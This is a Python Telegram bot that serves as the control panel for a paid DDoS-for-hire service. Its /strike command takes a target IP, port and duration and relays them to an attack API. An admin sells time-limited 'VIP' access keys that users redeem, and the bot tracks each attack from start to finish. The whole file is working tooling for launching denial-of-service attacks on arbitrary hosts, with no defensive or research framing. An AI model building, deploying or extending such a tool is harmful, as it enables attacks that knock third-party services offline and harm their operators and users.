import telebot
import json
import requests
import os
import threading
import time

# Get from environment variable
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID', '7837187893')
API_URL = os.environ.get('API_URL', 'http://localhost:8080/api/strike')
AUTH_KEY = os.environ.get('AUTH_KEY')

if not BOT_TOKEN:
    print("Error: BOT_TOKEN not set!")
    exit()

bot = telebot.TeleBot(BOT_TOKEN)

USERS_DB = "users.json"
KEYS_DB = "keys.json"

def load(f):
    if os.path.exists(f):
        with open(f, 'r') as x:
            return json.load(x)
    return {}

def save(f, d):
    with open(f, 'w') as x:
        json.dump(d, x, indent=4)

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "🔥 SYSTEM ACTIVE\n/help for commands")

@bot.message_handler(commands=['help'])
def help(m):
    txt = """
⚡ COMMANDS:
/strike <IP> <PORT> <TIME> - Attack
/redeem <KEY> - Activate
/me - Your Plan
/status - System Status

👑 ADMIN:
/gen <1h/1d> - Make Key
"""
    bot.reply_to(m, txt)

@bot.message_handler(commands=['gen'])
def gen(m):
    if str(m.from_user.id) != ADMIN_ID:
        return bot.reply_to(m, "❌ No permission")
    
    arg = m.text.split()
    if len(arg) < 2:
        return bot.reply_to(m, "/gen 1h")
    
    key = "VIP-" + os.urandom(3).hex().upper()
    kdb = load(KEYS_DB)
    kdb[key] = arg[1]
    save(KEYS_DB, kdb)
    bot.reply_to(m, f"✅ KEY: `{key}`\n⏱️ {arg[1]}")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    arg = m.text.split()
    if len(arg) < 2:
        return bot.reply_to(m, "/redeem VIP-XXXX")
    
    kdb = load(KEYS_DB)
    if arg[1] in kdb:
        udb = load(USERS_DB)
        udb[str(m.from_user.id)] = {"plan": kdb[arg[1]], "active": True}
        save(USERS_DB, udb)
        del kdb[arg[1]]
        save(KEYS_DB, kdb)
        bot.reply_to(m, "✅ ACTIVATED!")
    else:
        bot.reply_to(m, "❌ Invalid key")

@bot.message_handler(commands=['me'])
def me(m):
    udb = load(USERS_DB)
    uid = str(m.from_user.id)
    if uid in udb:
        bot.reply_to(m, f"✅ Plan: {udb[uid]['plan']}\nStatus: Active")
    else:
        bot.reply_to(m, "❌ No active plan")

@bot.message_handler(commands=['strike'])
def strike(m):
    udb = load(USERS_DB)
    uid = str(m.from_user.id)
    
    if uid not in udb or not udb[uid].get('active'):
        return bot.reply_to(m, "❌ No plan! /redeem")
    
    arg = m.text.split()
    if len(arg) != 4:
        return bot.reply_to(m, "/strike IP PORT TIME")
    
    ip, port, sec = arg[1], arg[2], arg[3]
    
    try:
        r = requests.get(f"{API_URL}?key={AUTH_KEY}&ip={ip}&port={port}&time={sec}", timeout=5)
        
        if r.status_code == 200:
            bot.reply_to(m, f"✅ ATTACK STARTED!\n🎯 {ip}:{port}\n⏱️ {sec}s")
            
            def done():
                bot.send_message(m.chat.id, f"✅ ATTACK FINISHED\n🎯 {ip}:{port}")
            
            threading.Timer(int(sec), done).start()
        else:
            bot.reply_to(m, f"❌ Error: {r.text}")
    except Exception as e:
        bot.reply_to(m, f"❌ API Error!\n{str(e)[:80]}")

@bot.message_handler(commands=['status'])
def status(m):
    try:
        r = requests.get(API_URL.replace('/api/strike', '/api/health'), timeout=3)
        api = "Online ✅" if r.status_code == 200 else "Offline ❌"
    except:
        api = "Offline ❌"
    
    bot.reply_to(m, f"🤖 Bot: Active ✅\n🔌 API: {api}\n💻 Host: Render")

print("🔥 BOT STARTING...")
bot.polling(none_stop=True)
